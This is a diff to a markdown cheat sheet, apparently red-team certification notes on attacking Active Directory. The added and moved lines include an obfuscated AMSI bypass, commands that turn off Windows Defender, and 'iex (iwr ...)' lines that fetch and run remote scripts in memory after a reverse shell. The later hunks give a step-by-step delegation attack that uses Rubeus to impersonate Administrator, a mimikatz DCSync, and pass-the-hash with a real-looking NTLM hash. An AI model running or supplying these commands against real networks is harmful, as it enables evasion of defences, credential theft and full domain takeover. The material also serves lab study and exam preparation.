@@ -36,7 +36,10 @@ use BloodHound to identify the shortest path to Domain Admins in the dollarcorp 
 ```
 C:/AD/Tools/InviShell/RunWithRegistryNonAdmin.bat
 ```
-
+### Bypass Script Block login
+```
+iex (iwr http://10.0.10.16/sbloggingbypass.txt-UseBasicParsing)
+```
 ### Bypass AMSI
 ```
 S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
@@ -46,10 +49,6 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{
 Powershell Set-MpPreference -DisableRealtimeMonitoring $true
 Powershell Set-MpPreference -DisableIOAVProtection $true
 PowerShell set-MpPreference -DisableAutoExclusions $true
-```
-### Bypass Script Block login
-```
-iex (iwr http://10.0.10.16/sbloggingbypass.txt-UseBasicParsing)
 ```
 ### Load Script in memory to bypass Windows Defender
 ```
@@ -83,8 +82,12 @@ list all the commands u can use in a particular module
 Get-Command -Module <modulename>
 ```
 
-Download PowerShell Script
+Run PowerShell Script on memory after getting a reverse shell
 ```
+iex (iwr http://10.0.10.16/sbloggingbypass.txt-UseBasicParsing)
+
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+
 iex ((New-Object Net.WebClient).DownloadString('http://10.10.10.6/PowerView.ps1')
 ```
 
@@ -2228,7 +2231,7 @@ Import-Module .\powerview.ps1
 ```
 3. check if the HRmanager user has interesting ACLs
 ```
-Find-InterestingDomainAcl -ResolveGUIDs
+Find-InterestingDomainAcl -ResolveGUIDs   
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/e3b4a62b-3134-4d0f-bccc-38aae3c23318)
 
@@ -2247,6 +2250,7 @@ New-MachineAccount -Domain cyber.local -MachineAccount dude -Password (ConvertTo
 Get-NetComputer dude | select objectsid
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/c6e7d638-7824-4841-a3e0-6a149bf2dd40)
+
 8. Now that we have extracted the private SID on the fake device, we will execute these commands while replacing the private SID on the fake device.
 ```
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4117163453-3728762355-2024759166-1601)"
@@ -2264,6 +2268,7 @@ Get-netcomputer jehaddc.m3c.local | Set-DomainObject -Set @{'msds-allowedtoacton
 .\Rubeus.exe hash /password:123 /user:dude$  /domain:cyber.local
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/a91bd270-d277-411d-b9b8-26364961813a)
+
 11. Now we will execute this command to obtain the TGS of the ldap service, since the target device is the Domain Controller (DC).
 ```
 .\Rubeus.exe s4u /domain:cyber.local /dc:JehadDC.cyber.local /user:dude$ /ptt /aes256:5B9C740C2E833C237562871A4B3C3B7FF7839D48C3CBB3CBB152E2E82C981928  /impersonateuser:Administrator /msdsspn:ldap/jehaddc.cyber.local
@@ -2273,11 +2278,13 @@ Get-netcomputer jehaddc.m3c.local | Set-DomainObject -Set @{'msds-allowedtoacton
 klist
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/d18aba56-540b-42ba-b2c7-29eb8764682b)
+
 13. Now that we have the private TGS in the ldap service, we will run mimikatz and get the private hash in the Domain Admin via this command
 ```
 lsadump::dcsync /user:cyber\Administrator
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/ee8ab9cd-2ad8-4bbd-8356-5fade3a5c5a2)
+
 14. Now we will set up the pass the hash technique using mimikatz so that we run a PowerShell session with Domain Admin privileges using this command.
 ```
 sekurlsa::pth /user:Administrator /ntlm:311fb27b1e766dac7357f4270f4112df /domain:cyber.local /run:powershell.exe
@@ -2287,3 +2294,4 @@ sekurlsa::pth /user:Administrator /ntlm:311fb27b1e766dac7357f4270f4112df /domain
 Enter-PSSession jehaddc.cyber.local
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/2e859f3e-1943-4296-862e-846e1033966d)
+
